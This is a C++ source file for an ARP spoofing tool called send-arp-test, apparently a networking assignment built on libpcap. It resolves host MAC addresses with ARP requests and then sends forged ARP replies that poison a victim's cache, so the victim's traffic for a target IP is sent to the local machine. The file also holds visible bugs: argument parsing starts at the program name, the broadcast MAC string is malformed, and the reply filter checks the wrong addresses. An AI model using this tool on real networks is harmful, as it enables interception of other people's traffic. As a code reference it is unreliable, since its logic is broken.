#include <cstdio>
#include <pcap.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <signal.h>
#include <errno.h>
#include <net/if.h>
#include <sys/ioctl.h>
#include <netinet/ether.h>
#include <arpa/inet.h>
#include <unistd.h>
#include "ethhdr.h"
#include "arphdr.h"

#pragma pack(push, 1)
struct EthArpPacket final {
	EthHdr eth_;
	ArpHdr arp_;
};
#pragma pack(pop)

void usage() {
	printf("syntax: send-arp-test <interface>\n");
	printf("sample: send-arp-test wlan0\n");
}

//Reference : https://pencil1031.tistory.com/66

int getIPAddress(uint32_t *ip_addr, char* dev) {
	int sock;
	struct ifreq ifr;
	struct sockaddr_in *sin;
	sock = socket(AF_INET, SOCK_STREAM, 0);
	if (sock < 0) {
		return 0;
	}
	strcpy(ifr.ifr_name, dev);
	if (ioctl(sock, SIOCGIFADDR, &ifr)< 0) {
		close(sock);
		return 0;
	}
	sin = (struct sockaddr_in*)&ifr.ifr_addr;
	*ip_addr = htonl(sin->sin_addr.s_addr);
	close(sock);
	return 1;
}

int getMacAddress(uint8_t *mac, char* dev) {
	int sock;
	struct ifreq ifr;	
	char mac_adr[18] = {0,};		
	sock = socket(AF_INET, SOCK_STREAM, 0);
	if (sock < 0) {		
		return 0;
	}	
	strcpy(ifr.ifr_name, dev);
	if (ioctl(sock, SIOCGIFHWADDR, &ifr)< 0) {
		close(sock);
		return 0;
	}
	for(int i=0; i<6; i++) {
		mac[i] = ((uint8_t*)ifr.ifr_hwaddr.sa_data)[i];
	}
	close(sock);
	return 1;
}

int f(pcap_t* handle, EthArpPacket *packet, Mac mac, uint32_t ip, uint32_t ip_a, Mac* mac_a){
	//make packet
	packet->eth_.dmac_ = Mac("FF:FF:FF:FF:FFFF");
	packet->eth_.smac_ = mac;
	packet->eth_.type_ = htons(EthHdr::Arp);
	packet->arp_.hrd_ = htons(ArpHdr::ETHER);
	packet->arp_.pro_ = htons(EthHdr::Ip4);
	packet->arp_.hln_ = Mac::SIZE;
	packet->arp_.pln_ = Ip::SIZE;
	packet->arp_.op_ = htons(ArpHdr::Request);
	packet->arp_.smac_ = mac;
	packet->arp_.sip_ = htonl(Ip(ip));
	packet->arp_.tmac_ = Mac("00:00:00:00:00:00");
	packet->arp_.tip_ = htonl(Ip(ip_a));
	//send packet
	int a = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(packet), sizeof(EthArpPacket));
	//wait packet
	struct pcap_pkthdr* header;
	const u_char* pack;
	while(1){
		int b = pcap_next_ex(handle,&header,&pack);
		if(b==0) continue;
		EthArpPacket* packet_a = (EthArpPacket*)pack;
		if(ntohs(packet_a->arp_.op_)!=ArpHdr::Reply) continue;
		if(ntohl(packet_a->arp_.sip_) != ip) continue;	
		if(ntohl(packet_a->arp_.tip_) != ip_a) continue;
		for(int i=0; i<6; i++) if(((uint8_t*)(packet_a->arp_.tmac_))[i] != ((uint8_t*)mac)[i]) continue;
		*mac_a = Mac(packet_a->arp_.smac_); 
		break;
	}	
	return 1;
}

void send_arp(pcap_t* handle, EthArpPacket *packet, Mac dmac, Mac smac, uint32_t sip, uint32_t tip){
		packet->eth_.dmac_ = dmac;
		packet->eth_.smac_ = smac;
		packet->eth_.type_ = htons(EthHdr::Arp);	
		packet->arp_.hrd_ = htons(ArpHdr::ETHER);
		packet->arp_.pro_ = htons(EthHdr::Ip4);	
		packet->arp_.hln_ = Mac::SIZE;
		packet->arp_.pln_ = Ip::SIZE;
		packet->arp_.op_ = htons(ArpHdr::Reply);
		packet->arp_.smac_ = smac;
		packet->arp_.sip_ = htonl(Ip(sip));
		packet->arp_.tmac_ = dmac;
		packet->arp_.tip_ = htonl(Ip(tip));
		int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(packet), sizeof(EthArpPacket));
}

int main(int argc, char* argv[]) {
	if (argc != 2) {
		usage();
		return -1;
	}

	char* dev = argv[1];
	char errbuf[PCAP_ERRBUF_SIZE];
	pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf);
	if (handle == nullptr) {
		fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
		return -1;
	}
	EthArpPacket packet;

	uint8_t m[6]={0,};
	uint32_t ip;
	int i;
	Mac mac;
	Mac mac_send;
	Mac mac_targ;
	uint32_t ip_send;
	uint32_t ip_targ;

	getIPAddress(&ip, dev);
	getMacAddress(m, dev);
	mac = Mac(m);
	
	i=0;
	while(1){
		printf("1");
		ip_send = Ip((argv[i])); ip_targ=Ip((argv[i+1]));
		if(f(handle, &packet, mac, ip, ip_targ, &mac_targ)==0) return 0;
		if(f(handle, &packet, mac, ip, ip_send, &mac_send)==0) return 0;
		send_arp(handle, &packet, mac_send, mac, ip_send, ip_targ);
		i+=2;
		if(i+2>=argc) break;
	}

	pcap_close(handle);
}
